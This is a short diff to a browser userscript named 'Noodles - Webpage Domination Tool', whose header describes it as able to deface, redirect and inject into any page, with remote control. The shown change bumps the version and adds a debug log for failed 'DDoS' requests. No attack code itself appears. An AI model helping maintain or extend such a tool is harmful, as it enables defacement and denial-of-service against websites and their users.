@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
-// @version 1.337.73
+// @version 1.337.74
 // @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
@@ -469,6 +469,8 @@
                     })
                     .catch(error => {
                        // Consider implementing a less verbose error handling.  Perhaps a counter.
+                       console.debug("DDoS Request Failed (no-cors)", error); // Less verbose logging.
+
                     });
                 }
             } catch (e) {
